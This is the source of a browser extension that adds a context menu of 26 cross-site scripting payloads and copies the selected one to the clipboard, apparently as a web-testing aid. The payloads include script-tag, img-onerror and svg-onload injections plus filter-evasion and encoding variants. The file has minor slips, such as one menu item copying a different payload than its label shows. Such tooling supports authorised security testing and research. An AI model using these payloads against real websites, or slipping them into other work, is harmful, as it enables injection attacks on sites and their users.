
function onCreated() {
    if (browser.runtime.lastError) {
        console.log(`Error: ${browser.runtime.lastError}`);
    } else {
        console.log("Item created successfully");
    }
}

function onError(error) {
    console.log(`Error: ${error}`);
}

function copyStringToClipboard(str) {
    var el = document.createElement('textarea');
    el.value = str;
    el.setAttribute('readonly', '');
    el.style = {
        position: 'absolute',
        left: '-9999px'
    };
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
}

browser.menus.create({
    id: "log-selection",
    title: browser.i18n.getMessage("menuItemSelectionLogger"),
    contexts: ["selection"]
}, onCreated);


browser.menus.create({
    id: "separator-1",
    type: "separator",
    contexts: ["all"]
}, onCreated);

browser.menus.create({
    id: "payload1",
    type: "radio",
    title: '<script>alert(1)</script>',
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload2",
    type: "radio",
    title: '"><script>alert(1)</script>',
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload3",
    type: "radio",
    title: '<img src="x" onerror="alert(1);">',
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload4",
    type: "radio",
    title: '<svg/onload = alert(1);>',
    contexts: ["all"],
    checked: true,

}, onCreated);


browser.menus.create({
    id: "payload5",
    type: "radio",
    title: '<scr<script>ipt>alert("XSS")</scr<script>ipt>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload6",
    type: "radio",
    title: '"><script>alert(String.fromCharCode(88,83,83))</script>',
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload7",
    type: "radio",
    title: '<script>\u0061lert("22")</script>',
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload8",
    type: "radio",
    title: "<script>eval('\x61lert(\'33\')')</script>",
    contexts: ["all"],
    checked: true,

}, onCreated);
// 
browser.menus.create({
    id: "payload9",
    type: "radio",
    title: '<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload10",
    type: "radio",
    title: '<scr<script>ipt>alert("XSS")</scr<script>ipt>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload11",
    type: "radio",
    title: '<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload12",
    type: "radio",
    title: '<img src=x onerror=alert(String.fromCharCode(88,83,83));>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload13",
    type: "radio",
    title: '<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload14",
    type: "radio",
    title: '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
    contexts: ["all"],
    checked: true,

}, onCreated);


browser.menus.create({
    id: "payload15",
    type: "radio",
    title: '"><img src=x onerror=alert(String.fromCharCode(88,83,83));>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload16",
    type: "radio",
    title: '<><img src=1 onerror=alert(1)>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload17",
    type: "radio",
    title: '<svgonload=alert(1)>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload18",
    type: "radio",
    title: "<svg/onload=alert('XSS')>",
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload19",
    type: "radio",
    title: '<svg onload=alert(1)//',
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload20",
    type: "radio",
    title: '<svg/onload=alert(String.fromCharCode(88,83,83))>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload21",
    type: "radio",
    title: '<svg id=alert(1) onload=eval(id)>',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload22",
    type: "radio",
    title: '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload23",
    type: "radio",
    title: '"><svg/onload=alert(/XSS/)',
    contexts: ["all"],
    checked: true,

}, onCreated);

browser.menus.create({
    id: "payload24",
    type: "radio",
    title: '<svg><script href=data:,alert(1) />(`Firefox`cc)',
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload25",
    type: "radio",
    title: "<svg><script>alert('33')",
    contexts: ["all"],
    checked: true,

}, onCreated);
browser.menus.create({
    id: "payload26",
    type: "radio",
    title: '<div onpointerup="alert(45)">MOVE HERE</div>',
    contexts: ["all"],
    checked: true,

}, onCreated);




function updateCheckUncheck() {
    checkedState = !checkedState;
    if (checkedState) {
        browser.menus.update("check-uncheck", {
            title: browser.i18n.getMessage("menuItemUncheckMe"),
        });
    } else {
        browser.menus.update("check-uncheck", {
            title: browser.i18n.getMessage("menuItemCheckMe"),
        });
    }
}

browser.menus.onClicked.addListener((info, tab) => {
    switch (info.menuItemId) {
        case "log-selection":
            console.log(info.selectionText);
            break;
        case "payload1":
            copyStringToClipboard('<script>alert(1)</script>');
            break;
        case "payload2":
            copyStringToClipboard('"><script>alert(1)</script>');
            break;
        case "payload3":
            copyStringToClipboard('<img src="x" onerror="alert(1);">');
            break;
        case "payload4":
            copyStringToClipboard('<svg/onload = alert(1);>');
            break;
        case "payload5":
            copyStringToClipboard('<scr<script>ipt>alert("XSS")</scr<script>ipt>');
            break;
        case "payload6":
            copyStringToClipboard('"><script>alert(String.fromCharCode(88,83,83))</script>');
            break;
        case "payload7":
            copyStringToClipboard('<script>\u0061lert("22")</script>');
            break;
        case "payload8":
            copyStringToClipboard("<script>eval('\x61lert(\'33\')')</script>");
            break;
        case "payload9":
            copyStringToClipboard('<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"');
            break;
        case "payload10":
            copyStringToClipboard('<scr<script>ipt>alert("XSS")</scr<script>ipt>');
            break;
        case "payload11":
            copyStringToClipboard('<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">');
            break;
        case "payload12":
            copyStringToClipboard('<img src=x onerror=alert(String.fromCharCode(88,83,83));>');
            break;
        case "payload13":
            copyStringToClipboard('<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>');
            break;
        case "payload14":
            copyStringToClipboard('<img src=x:alert(alt) onerror=eval(src) alt=xss>');
            break;
        case "payload15":
            copyStringToClipboard('"><img src=x onerror=alert(String.fromCharCode(88,83,83));>');
            break;

        case "payload16":
            copyStringToClipboard('<><img src=1 onerror=alert(1)>');
            break;
        case "payload17":
            copyStringToClipboard('<svgonload=alert(1)>');
            break;

        case "payload18":
            copyStringToClipboard("<svg/onload=alert('XSS')>");
            break;

        case "payload19":
            copyStringToClipboard('<svg onload=alert(1)//');
            break;

        case "payload20":
            copyStringToClipboard('<svg/onload=alert(String.fromCharCode(88,83,83))>');
            break;

        case "payload21":
            copyStringToClipboard('<svg id=alert(1) onload=eval(id)>');
            break;

        case "payload22":
            copyStringToClipboard('"><svg/onload=alert(String.fromCharCode(88,83,83))>');
            break;
        case "payload23":
            copyStringToClipboard('"><svg/onload=alert(/XSS/)');
            break;

        case "payload24":
            copyStringToClipboard('<svg><script href=data:,alert(1) />(`Firefox`cc)');
            break;
        case "payload25":
            copyStringToClipboard("<svg><script>alert('33')");
            break;
        case "payload26":
            copyStringToClipboard("<svg><script>alert('33')");
            break;


    }
});